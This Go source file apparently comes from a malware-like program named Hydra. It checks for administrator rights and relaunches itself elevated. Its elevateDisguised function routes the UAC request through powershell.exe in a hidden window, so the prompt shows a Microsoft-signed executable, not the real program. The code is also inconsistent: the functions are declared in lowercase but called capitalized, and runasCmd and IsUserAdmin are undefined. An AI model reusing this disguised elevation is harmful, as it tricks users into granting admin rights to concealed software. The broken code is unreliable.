package util

import (
	"errors"
	"fmt"
	"os"
	"syscall"

	"golang.org/x/sys/windows"
)

// RunningAsAdmin returns whether the current process has administrative privileges.
func runningAsAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid,
	)
	Handle(err)
	token := windows.Token(0)
	member, err := token.IsMember(sid)
	Handle(err)

	return member
}

// RunAsAdmin attempts to execute a command with admin rights.
func runAsAdmin(command, arguments string) error {
	verb, _ := syscall.UTF16PtrFromString("runas")
	exec, _ := syscall.UTF16PtrFromString(command)
	t, _ := os.Getwd()
	cwd, _ := syscall.UTF16PtrFromString(t)
	args, _ := syscall.UTF16PtrFromString(arguments)

	return windows.ShellExecute(0, verb, exec, args, cwd, windows.SW_HIDE)
}

// ElevateNormal attempts to relaunch Hydra with admin rights.
// It displays a common UAC prompt to the user, with the name of the executable.
func elevateNormal() error {
	exe, _ := os.Executable()
	if err := RunAsAdmin(exe, "chill"); err != nil {
		return err
	}
	os.Exit(0)
	return nil
}

// ElevateDisguised attempts to relaunch Hydra with admin rights.
// It displays a common UAC prompt to the user, containing the details of an
// executable signed by Microsoft, namely powershell.exe.
func elevateDisguised() error {
	exe, _ := os.Executable()
	args := fmt.Sprintf(runasCmd, exe)
	if err := RunAsAdmin("powershell", args); err != nil {
		return err
	}
	os.Exit(0)
	//oh, hi there
	return nil
}

func elevateLogic() error {
	if RunningAsAdmin() {
		return nil
	}
	if !IsUserAdmin() {
		return errors.New("This user does not have admin rights")
	}
	return ElevateDisguised()
}
